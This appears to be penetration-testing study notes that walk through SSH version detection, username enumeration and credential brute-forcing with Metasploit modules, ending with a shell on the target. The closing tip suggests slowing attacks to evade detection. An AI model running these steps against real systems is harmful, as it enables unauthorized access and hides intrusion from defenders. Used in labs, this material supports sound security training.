## What is SSH?

Secure Shell —> an encrypted remote administration protocol running on **TCP port 22** by default. Successor to Telnet (which sends data in cleartext). Authentication methods: password-based or public/private key pairs.

## SSH Enumeration Workflow

**Step 1 — Identify SSH version**

```bash
use auxiliary/scanner/ssh/ssh_version
run
# Result: OpenSSH 7.9p1 on Ubuntu 19.04
```

**Step 2 — Enumerate valid usernames first (recommended)**

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
# Result: sysadmin, rooty, demo, auditor, anon, administrator, diag
```

**Step 3 — Brute force SSH credentials**

```bash
use auxiliary/scanner/ssh/ssh_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set VERBOSE false
run
# Result: sysadmin : hailey → SSH session opened automatically
```

**Step 4 — Interact with the session**

```bash
sessions              # list active sessions
sessions 1            # connect to session 1
/bin/bash -i          # spawn interactive bash shell
whoami                # confirm user: sysadmin
```

## Key Modules Summary

|Module|Purpose|
|---|---|
|`ssh_version`|SSH version and OS detection|
|`ssh_enumusers`|Enumerate valid usernames|
|`ssh_login`|Brute force + auto-opens session on success|
|`ssh_login_pubkey`|Brute force using key-pair authentication|

## Recommended Order

Enumerate users first → then target specific users in brute force. This is much faster than brute forcing all username/password combinations blindly.

**Note:** SSH logs failed attempts — reduce brute force speed on monitored targets to avoid detection.
